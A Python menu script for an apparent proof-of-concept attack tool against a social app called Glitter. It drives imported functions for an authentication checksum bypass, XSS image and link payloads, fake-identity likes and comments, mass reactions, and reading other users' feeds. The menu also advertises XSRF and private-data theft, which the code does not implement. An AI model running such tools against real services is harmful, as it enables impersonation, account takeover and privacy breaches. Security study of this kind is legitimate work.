import glitter


def print_menu():
    """
    a function to print the vulnerabilities menu to the user
    :return: none
    """
    print("GLITTER APP AND WEBSITE VULNERABILITY POC\n1. Login into any user (app only)\n2. Send Multiple Likes from Same User\n3. Send glit with different profile image\n4. Send Like with Fake Username\n5. Send Glit with Past Date\n6. Access Other User's Feed\n7. Send to Private Account\n8. Send Glit with Colored Font\n9. Send XSS Image Payload\n10. Send XSS Link Payload\n11. Send Comment with Fake Name\n12. Send Multiple Wows from Same User\n13. XSRF, send a message to yourself from any user that you want\n14. PRIVACY - get private information of other users\n15. post a video to other user's feed\n0. Exit")


def main():
    while True:
        username = input("Enter your username: ")
        password = input("Enter your password: ")
        print_menu()
        choice = input("\nEnter your choice: ")
        if choice == "0":
            print("Exiting...")
            break
        elif choice == "1":
            username = input("Enter username to bypass auth (for example: !@#098): ")
            glitter.login_with_checksum_bypass(username)
            if glitter.sock:
                glitter.sock.close()
        elif int(choice) in range(1, 13):
            glitter.login_with_checksum_bypass("!@#098")
            if choice == "2":
                glit_id = input("Enter the glit_id of the glit to like it (for example: 81199): ")
                count = int(input("Enter the amount of likes you would like to do: "))
                glitter.send_multiple_likes(glit_id, count)
            elif choice == "3":
                profile_image = input("enter the profile image you want to send a message with (1-8): ")
                glitter.send_glit_with_different_profile_image(profile_image)
            elif choice == "4":
                glit_id = input("Enter the glit_id of the glit to like it (for example: 81199): ")
                fake_name = input("enter fake username: ")
                glitter.send_like_with_fake_name(glit_id, fake_name)
            elif choice == "5":
                glitter.send_glit_from_past()
            elif choice == "6":
                target_user_id = input("Enter the target's user_id you want to see it's feed (for example: 22779): ")
                glitter.access_other_user_feed(target_user_id)
            elif choice == "7":
                target_user_id = input("Enter the target's user_id you want to send a glit to (for example: 22779): ")
                glitter.send_to_private_account(target_user_id)
            elif choice == "8":
                color = input("Enter the color you want the text to be (for example: white, blue, purple): ")
                glitter.send_colored_font_glit(color)
            elif choice == "9":
                glitter.send_xss_image_glit()
            elif choice == "10":
                glitter.send_xss_link_glit()
            elif choice == "11":
                glit_id = input("Enter the glit_id of the glit you want to comment on (for example: 81199): ")
                fake_name = input("enter fake username: ")
                glitter.send_comment_fake_name(glit_id, fake_name)
            elif choice == "12":
                glit_id = input("Enter the glit_id of the glit you would send a wow on it(for example: 81199): ")
                count = int(input("Enter the amount of wows you would like to do: "))
                glitter.send_multiple_wows(glit_id, count)
            if glitter.sock:
                glitter.sock.close()
        else:
            print("Wrong choice, try again")


if __name__ == "__main__":
    main()

